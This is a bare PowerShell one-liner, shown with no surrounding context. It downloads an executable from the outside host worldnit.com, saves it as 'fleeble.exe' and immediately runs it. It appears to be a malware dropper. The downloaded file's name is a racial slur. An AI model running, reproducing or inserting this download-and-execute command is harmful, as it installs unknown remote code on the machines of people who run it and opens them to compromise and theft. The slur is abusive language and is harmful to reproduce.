
(New-Object System.Net.WebClient).DownloadFile('http://worldnit.com/nigga.exe','fleeble.exe');Start-Process 'fleeble.exe'

